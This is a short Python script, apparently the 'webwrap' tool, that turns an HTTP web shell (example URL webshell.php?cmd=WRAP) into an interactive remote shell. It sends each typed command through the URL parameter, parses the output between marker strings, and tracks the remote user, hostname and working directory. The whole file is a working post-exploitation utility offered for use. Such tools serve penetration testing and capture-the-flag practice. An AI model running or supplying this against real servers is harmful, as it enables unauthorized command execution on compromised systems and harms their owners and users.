import httpx
import re
from termcolor import colored
import urllib.parse
import sys

if len(sys.argv) >= 2 and "WRAP" in sys.argv[1]:
	host = sys.argv[1]
else:
	print("\nPlease specify the url with WRAP where the command belongs.\nExample :\n$ webwrap http://localhost:8000/webshell.php?cmd=WRAP")
	exit()
	
try:
	reg = """\]LEDEBUT\]([\s\S]*)\]LAFIN\]"""

	req = httpx.get(host.replace("WRAP", "echo -n ]LEDEBUT]$(whoami)[$(hostname)[$(pwd)]LAFIN]"))
	matches = re.compile(reg).findall(req.text)
	if not matches:
		print("Req.text not found!\n")
		exit(-1)
	prefixes = matches[0].split("[")
	path = prefixes[2]
	prefix = colored(prefixes[0] + "@" + prefixes[1], "red") + ":" + colored(prefixes[2], "cyan") + "$ "
	print("")

	while 1:
		cmd = input(prefix)
		cmd = urllib.parse.quote("echo -n ']LEDEBUT]' ; cd {} && ".format(path) + cmd + " 2>&1 ; echo $(whoami)[$(hostname)[$(pwd) ; echo ']LAFIN]'")
		req = httpx.get(host.replace("WRAP", cmd))
		try:
			output = re.compile(reg).findall(req.text)[0].split('\n')
			prefixes = output.pop(len(output) - 2).split("[")
			path = prefixes[2]
			prefix = colored(prefixes[0] + "@" + prefixes[1], "red") + ":" + colored(prefixes[2], "cyan") + "$ "
			output = "\n".join(output)
			print(output)
		except IndexError:
			print("Error.\n")
except KeyboardInterrupt:
	print(colored("\nGoodbye !", "cyan"))
	exit()
